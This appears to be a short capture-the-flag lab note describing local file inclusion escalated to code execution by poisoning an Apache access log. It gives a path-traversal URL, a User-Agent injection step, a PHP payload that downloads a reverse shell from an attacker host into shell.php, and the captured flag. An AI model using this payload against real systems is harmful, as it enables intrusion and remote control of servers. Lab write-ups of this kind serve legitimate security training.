# Target
http://10.10.41.228/?view=dog/../../../../var/log/apache2/access&ext=.log

# PHP Injection
Modify User Agent with Burp or another proxy to PHP code.

# Payload
```php 
<?php file_put_contents('shell.php', file_get_contents('http://10.11.21.187:8989/php-reverse-shell.php'))?>
```
# Flag
cat /var/www/flag2_QMW7JvaY2LvK.txt
`THM{LF1_t0_RC3_aec3fb}`
